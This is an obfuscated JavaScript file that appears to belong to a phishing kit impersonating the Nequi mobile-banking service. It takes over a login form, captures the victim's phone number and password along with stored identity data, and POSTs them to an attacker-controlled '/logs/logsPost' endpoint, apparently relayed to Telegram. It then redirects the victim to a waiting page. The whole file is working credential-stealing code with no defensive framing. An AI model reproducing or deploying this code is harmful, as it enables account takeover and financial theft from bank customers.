function _0x2047() {
  const _0x5ebbf9 = [
    "Nequi",
    "21520Cvnihl",
    "320UezchI",
    "46318lLFuts",
    "puser",
    "10PTbhzq",
    "preventDefault",
    "getElementById",
    "user",
    "4xGfSAv",
    "value",
    "Por\x20favor\x20ingrese\x20su\x20número\x20de\x20celular",
    "POST",
    "txt-num",
    "dudename",
    "metaInfo",
    "setItem",
    "telnum",
    "4445724cHAvCH",
    "3731222wjqqrd",
    "btn-consultar",
    "href",
    "Datos\x20enviados\x20a\x20trico",
    "14589GTnZEJ",
    "location",
    "1984381XueFZu",
    "log",
    "application/json",
    "focus",
    "149874qThGfQ",
    "stringify",
    "510yxkdOw",
    "click",
    "txt-pass",
    "Error\x20al\x20enviar\x20los\x20datos:",
    "./wait.html",
    "disabled",
    "5vfoouU",
    "info",
  ];
  _0x2047 = function () {
    return _0x5ebbf9;
  };
  return _0x2047();
}
const _0x3aae78 = _0x2106;
function _0x2106(_0x5a5586, _0x4b13f5) {
  const _0x2047dd = _0x2047();
  return (
    (_0x2106 = function (_0x210683, _0x38ca97) {
      _0x210683 = _0x210683 - 0xb0;
      let _0x15cbb0 = _0x2047dd[_0x210683];
      return _0x15cbb0;
    }),
    _0x2106(_0x5a5586, _0x4b13f5)
  );
}
(function (_0x347c0f, _0x3a9f77) {
  const _0x4aa390 = _0x2106,
    _0x271009 = _0x347c0f();
  while (!![]) {
    try {
      const _0x39f38a =
        (-parseInt(_0x4aa390(0xb8)) / 0x1) *
          (-parseInt(_0x4aa390(0xbd)) / 0x2) +
        (-parseInt(_0x4aa390(0xb0)) / 0x3) * (parseInt(_0x4aa390(0xc3)) / 0x4) +
        (-parseInt(_0x4aa390(0xbb)) / 0x5) * (parseInt(_0x4aa390(0xb2)) / 0x6) +
        -parseInt(_0x4aa390(0xd3)) / 0x7 +
        (-parseInt(_0x4aa390(0xbc)) / 0x8) *
          (-parseInt(_0x4aa390(0xd1)) / 0x9) +
        (parseInt(_0x4aa390(0xbf)) / 0xa) * (parseInt(_0x4aa390(0xcd)) / 0xb) +
        parseInt(_0x4aa390(0xcc)) / 0xc;
      if (_0x39f38a === _0x3a9f77) break;
      else _0x271009["push"](_0x271009["shift"]());
    } catch (_0x472de) {
      _0x271009["push"](_0x271009["shift"]());
    }
  }
})(_0x2047, 0x2ea39);
function updateLS() {
  const _0x38b3c3 = _0x2106;
  LS[_0x38b3c3(0xca)](_0x38b3c3(0xb9), JSON[_0x38b3c3(0xb1)](info));
}
async function sendDataToServerAndTelegram() {
  const _0x4b34bf = _0x2106,
    _0x24e6f7 = document[_0x4b34bf(0xc1)](_0x4b34bf(0xce));
  _0x24e6f7[_0x4b34bf(0xb7)] = !![];
  try {
    const _0x271948 = {
        reg: info[_0x4b34bf(0xc9)]["cc"],
        name: info[_0x4b34bf(0xc9)][_0x4b34bf(0xc8)],
        cl: info["metaInfo"][_0x4b34bf(0xcb)],
        us: info[_0x4b34bf(0xc9)][_0x4b34bf(0xc2)],
        ps: info["metaInfo"][_0x4b34bf(0xbe)],
        fuente: _0x4b34bf(0xba),
        status: "Ingresó\x20usuario",
        bn: _0x4b34bf(0xba),
      },
      _0x24da1d = await fetch(url + "/logs/logsPost", {
        method: _0x4b34bf(0xc6),
        headers: { "Content-Type": _0x4b34bf(0xd5) },
        body: JSON["stringify"](_0x271948),
      });
    if (!_0x24da1d["ok"])
      throw new Error("Error\x20en\x20el\x20POST\x20a\x20tricoNequi");
    console[_0x4b34bf(0xd4)](_0x4b34bf(0xd0)),
      (window[_0x4b34bf(0xd2)][_0x4b34bf(0xcf)] = _0x4b34bf(0xb6));
  } catch (_0x5eeb06) {
    console["error"](_0x4b34bf(0xb5), _0x5eeb06),
      alert(
        "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
      );
  } finally {
    _0x24e6f7[_0x4b34bf(0xb7)] = ![];
  }
}
document[_0x3aae78(0xc1)](_0x3aae78(0xce))["addEventListener"](
  _0x3aae78(0xb3),
  function (_0x2dbd21) {
    const _0x1b3b14 = _0x3aae78;
    _0x2dbd21[_0x1b3b14(0xc0)](), console["log"](_0x1b3b14(0xb3));
    if (document[_0x1b3b14(0xc1)]("txt-num")[_0x1b3b14(0xc4)] == "") {
      alert(_0x1b3b14(0xc5)),
        document[_0x1b3b14(0xc1)](_0x1b3b14(0xc7))[_0x1b3b14(0xd6)]();
      return;
    } else {
      if (document[_0x1b3b14(0xc1)]("txt-pass")[_0x1b3b14(0xc4)] == "") {
        alert("Por\x20favor\x20ingrese\x20su\x20contraseña"),
          document[_0x1b3b14(0xc1)]("txt-pass")[_0x1b3b14(0xd6)]();
        return;
      } else {
        const _0x1e31b7 = document[_0x1b3b14(0xc1)](_0x1b3b14(0xc7))["value"],
          _0x3de4e9 = document[_0x1b3b14(0xc1)](_0x1b3b14(0xb4))["value"];
        (info[_0x1b3b14(0xc9)][_0x1b3b14(0xc2)] = _0x1e31b7),
          (info["metaInfo"][_0x1b3b14(0xbe)] = _0x3de4e9),
          updateLS(),
          sendDataToServerAndTelegram();
      }
    }
  }
),
  document["getElementById"]("backbutton")["addEventListener"](
    _0x3aae78(0xb3),
    function () {
      const _0x4179e5 = _0x3aae78;
      window[_0x4179e5(0xd2)][_0x4179e5(0xcf)] = "../../pay.html";
    }
  );
